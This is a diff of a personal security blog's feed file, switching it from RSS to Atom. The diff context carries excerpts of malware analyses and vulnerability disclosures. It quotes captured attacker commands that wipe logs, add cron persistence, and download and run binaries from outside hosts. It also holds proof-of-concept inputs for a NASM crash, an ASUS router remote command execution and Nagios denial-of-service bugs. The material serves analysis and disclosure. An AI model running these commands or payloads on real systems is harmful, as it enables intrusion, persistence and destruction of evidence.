@@ -1,17 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title></title>
-    <description>Blog</description>
-    <link>https://fakhrizulkifli.github.io/</link>
-    <atom:link href="https://fakhrizulkifli.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 05 Dec 2018 13:21:48 +0800</pubDate>
-    <lastBuildDate>Wed, 05 Dec 2018 13:21:48 +0800</lastBuildDate>
-    <generator>Jekyll v3.8.5</generator>
-    
-      <item>
-        <title>3945ac76b591cdbd50515b9f65821a64</title>
-        <description>&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2018-12-12T01:53:01+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><subtitle>Personal blog.</subtitle><entry><title type="html">3945ac76b591cdbd50515b9f65821a64</title><link href="http://localhost:4000/posts/2018/09/21/3945ac76b591cdbd50515b9f65821a64/" rel="alternate" type="text/html" title="3945ac76b591cdbd50515b9f65821a64" /><published>2018-09-21T00:00:00+08:00</published><updated>2018-09-21T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/09/21/3945ac76b591cdbd50515b9f65821a64</id><content type="html" xml:base="http://localhost:4000/posts/2018/09/21/3945ac76b591cdbd50515b9f65821a64/">&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;
 
 &lt;p&gt;key = BB2FA36AAA9541F0&lt;/p&gt;
 
@@ -64,18 +51,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed -i \'/\\/etc\\/cron.hourly\\/gcc4.sh/d\' /etc/crontab &amp;amp;&amp;amp; echo \'*/3 * * * * root /etc/cron.hourly/gcc4.sh\' &amp;gt; /etc/crontab
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Fri, 21 Sep 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/3945ac76b591cdbd50515b9f65821a64/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/3945ac76b591cdbd50515b9f65821a64/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>b08f9dc5784532be5b3f695f37c7781b</title>
-        <description>&lt;p&gt;Initial file dropped:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Upon decompiling, there is a subroutine called as encrypt_code. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).</summary></entry><entry><title type="html">b08f9dc5784532be5b3f695f37c7781b</title><link href="http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/" rel="alternate" type="text/html" title="b08f9dc5784532be5b3f695f37c7781b" /><published>2018-09-06T00:00:00+08:00</published><updated>2018-09-06T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b</id><content type="html" xml:base="http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/">&lt;p&gt;Initial file dropped:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -164,18 +140,7 @@ support
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Thu, 06 Sep 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title>
-        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped:</summary></entry><entry><title type="html">[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title><link href="http://localhost:4000/posts/2018/09/05/CVE-2018-16517/" rel="alternate" type="text/html" title="[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)" /><published>2018-09-05T00:00:00+08:00</published><updated>2018-09-05T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/09/05/CVE-2018-16517</id><content type="html" xml:base="http://localhost:4000/posts/2018/09/05/CVE-2018-16517/">&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
 
 &lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
 
@@ -333,18 +298,7 @@ The &lt;code class=&quot;highlighter-rouge&quot;&gt;output_ins.label&lt;/code&gt
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boom&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 05 Sep 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>03cc8d5deeb63e30f5a5d945abf99b00</title>
-        <description>&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.</summary></entry><entry><title type="html">03cc8d5deeb63e30f5a5d945abf99b00</title><link href="http://localhost:4000/posts/2018/08/27/03cc8d5deeb63e30f5a5d945abf99b00/" rel="alternate" type="text/html" title="03cc8d5deeb63e30f5a5d945abf99b00" /><published>2018-08-27T00:00:00+08:00</published><updated>2018-08-27T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/08/27/03cc8d5deeb63e30f5a5d945abf99b00</id><content type="html" xml:base="http://localhost:4000/posts/2018/08/27/03cc8d5deeb63e30f5a5d945abf99b00/">&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
@@ -685,18 +639,7 @@ bookaires[.]com/feed/feedonep.php - Feed one random username and password
     &quot;syslog&quot;: false,
     &quot;threads&quot;: null
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 27 Aug 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/03cc8d5deeb63e30f5a5d945abf99b00/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/03cc8d5deeb63e30f5a5d945abf99b00/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>08c6ac693d5d43fb8dec0451fe413e34</title>
-        <description>&lt;p&gt;Initial file dropped&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped via Bash script:</summary></entry><entry><title type="html">08c6ac693d5d43fb8dec0451fe413e34</title><link href="http://localhost:4000/posts/2018/08/14/08c6ac693d5d43fb8dec0451fe413e34/" rel="alternate" type="text/html" title="08c6ac693d5d43fb8dec0451fe413e34" /><published>2018-08-14T00:00:00+08:00</published><updated>2018-08-14T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/08/14/08c6ac693d5d43fb8dec0451fe413e34</id><content type="html" xml:base="http://localhost:4000/posts/2018/08/14/08c6ac693d5d43fb8dec0451fe413e34/">&lt;p&gt;Initial file dropped&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -1068,18 +1011,7 @@ killall Tools-file&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/bill.lock
 udevd.lock
 /tmp/notify.file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Tue, 14 Aug 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/08c6ac693d5d43fb8dec0451fe413e34/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/08c6ac693d5d43fb8dec0451fe413e34/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution</title>
-        <description>&lt;p&gt;Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution&lt;br /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped</summary></entry><entry><title type="html">[CVE-2018-15887] ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution</title><link href="http://localhost:4000/posts/2018/08/02/CVE-2018-15887/" rel="alternate" type="text/html" title="[CVE-2018-15887] ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution" /><published>2018-08-02T00:00:00+08:00</published><updated>2018-08-02T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/08/02/CVE-2018-15887</id><content type="html" xml:base="http://localhost:4000/posts/2018/08/02/CVE-2018-15887/">&lt;p&gt;Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution&lt;br /&gt;
 Date: 2018-08-02&lt;br /&gt;
 Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
 Vendor Homepage: https://www.asus.com/&lt;br /&gt;
@@ -1103,18 +1035,7 @@ Accept-Language: en-US,en;q=0.9
 &lt;p&gt;To connect&lt;/p&gt;
 &lt;ol&gt;
   &lt;li&gt;telnet www.target.com 1337&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Thu, 02 Aug 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>4ec4f1ec6a030c4969bd336258f6699e</title>
-        <description>&lt;p&gt;Initial file dropped was a Bash file containing following commands:&lt;/p&gt;
+&lt;/ol&gt;</content><author><name></name></author><summary type="html">Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution Date: 2018-08-02 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.asus.com/ Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/ Version: 1.1.2.3_345 Tested on: 1.1.2.3_345</summary></entry><entry><title type="html">4ec4f1ec6a030c4969bd336258f6699e</title><link href="http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e/" rel="alternate" type="text/html" title="4ec4f1ec6a030c4969bd336258f6699e" /><published>2018-07-18T00:00:00+08:00</published><updated>2018-07-18T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e/">&lt;p&gt;Initial file dropped was a Bash file containing following commands:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/tmp/.sys.log
 curl http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/tmp/.sys.log &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; wget http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /var/tmp/.sys.log
@@ -1295,50 +1216,28 @@ User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt
     &quot;user-agent&quot;: null,
     &quot;watch&quot;: false
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 18 Jul 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/4ec4f1ec6a030c4969bd336258f6699e/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/4ec4f1ec6a030c4969bd336258f6699e/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Nagios Core qh_core Denial of Service</title>
-        <description>&lt;p&gt;Exploit Title: Nagios Core qh_core Denial of Service&lt;br /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped was a Bash file containing following commands:</summary></entry><entry><title type="html">[CVE-2018-13441] Nagios Core qh_help Denial of Service</title><link href="http://localhost:4000/posts/2018/07/09/CVE-2018-13441/" rel="alternate" type="text/html" title="[CVE-2018-13441] Nagios Core qh_help Denial of Service" /><published>2018-07-09T00:00:00+08:00</published><updated>2018-07-09T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/09/CVE-2018-13441</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/09/CVE-2018-13441/">&lt;p&gt;Exploit Title: Nagios Core qh_help Denial of Service&lt;br /&gt;
 Date: 2018-07-09&lt;br /&gt;
 Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
 Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
 Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
 Version: 4.4.1 and earlier&lt;br /&gt;
 Tested on: 4.4.1&lt;br /&gt;
-CVE : CVE-2018-13458&lt;br /&gt;&lt;/p&gt;
+CVE : CVE-2018-13441&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;qh_core in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
+&lt;p&gt;qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne “#core\0&quot; | socat unix-connect:./poc/nagios.qh -
-$ echo -ne “@core\0&quot; | socat unix-connect:./poc/nagios.qh -
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne “#help\0&quot; | socat unix-connect:./poc/nagios.qh -
+$ echo -ne “@help\0&quot; | socat unix-connect:./poc/nagios.qh -
 
-#0 0x5546bc in qh_core /home/user/nagioscore/base/query-handler.c:408:6
+#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7
 #1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12
 #2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4
 #3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12
 #4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
-#5 0x7f6887b9882f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
 #6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Nagios Core qh_echo Denial of Service</title>
-        <description>&lt;p&gt;Exploit Title: Nagios Core qh_echo Denial of Service&lt;br /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: Nagios Core qh_help Denial of Service Date: 2018-07-09 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.nagios.org/ Software Link: https://www.nagios.org/downloads/nagios-core/ Version: 4.4.1 and earlier Tested on: 4.4.1 CVE : CVE-2018-13441</summary></entry><entry><title type="html">[CVE-2018-13457] Nagios Core qh_echo Denial of Service</title><link href="http://localhost:4000/posts/2018/07/09/CVE-2018-13457/" rel="alternate" type="text/html" title="[CVE-2018-13457] Nagios Core qh_echo Denial of Service" /><published>2018-07-09T00:00:00+08:00</published><updated>2018-07-09T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/09/CVE-2018-13457</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/09/CVE-2018-13457/">&lt;p&gt;Exploit Title: Nagios Core qh_echo Denial of Service&lt;br /&gt;
 Date: 2018-07-09&lt;br /&gt;
 Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
 Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
@@ -1360,46 +1259,25 @@ $ echo -ne “@echo\0&quot; | socat unix-connect:./poc/nagios.qh -
 #5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
 #6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
 #7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Nagios Core qh_help Denial of Service</title>
-        <description>&lt;p&gt;Exploit Title: Nagios Core qh_help Denial of Service&lt;br /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: Nagios Core qh_echo Denial of Service Date: 2018-07-09 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.nagios.org/ Software Link: https://www.nagios.org/downloads/nagios-core/ Version: 4.4.1 and earlier Tested on: 4.4.1 CVE : CVE-2018-13457</summary></entry><entry><title type="html">[CVE-2018-13458] Nagios Core qh_core Denial of Service</title><link href="http://localhost:4000/posts/2018/07/09/CVE-2018-13458/" rel="alternate" type="text/html" title="[CVE-2018-13458] Nagios Core qh_core Denial of Service" /><published>2018-07-09T00:00:00+08:00</published><updated>2018-07-09T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/09/CVE-2018-13458</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/09/CVE-2018-13458/">&lt;p&gt;Exploit Title: Nagios Core qh_core Denial of Service&lt;br /&gt;
 Date: 2018-07-09&lt;br /&gt;
 Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
 Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
 Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
 Version: 4.4.1 and earlier&lt;br /&gt;
 Tested on: 4.4.1&lt;br /&gt;
-CVE : CVE-2018-13441&lt;br /&gt;&lt;/p&gt;
+CVE : CVE-2018-13458&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
+&lt;p&gt;qh_core in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne “#help\0&quot; | socat unix-connect:./poc/nagios.qh -
-$ echo -ne “@help\0&quot; | socat unix-connect:./poc/nagios.qh -
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne “#core\0&quot; | socat unix-connect:./poc/nagios.qh -
+$ echo -ne “@core\0&quot; | socat unix-connect:./poc/nagios.qh -
 
-#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7
+#0 0x5546bc in qh_core /home/user/nagioscore/base/query-handler.c:408:6
 #1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12
 #2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4
 #3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12
 #4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
-#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+#5 0x7f6887b9882f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
 #6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</link>
-        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</guid>
-        
-        
-      </item>
-    
-  </channel>
-</rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: Nagios Core qh_core Denial of Service Date: 2018-07-09 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.nagios.org/ Software Link: https://www.nagios.org/downloads/nagios-core/ Version: 4.4.1 and earlier Tested on: 4.4.1 CVE : CVE-2018-13458</summary></entry></feed>
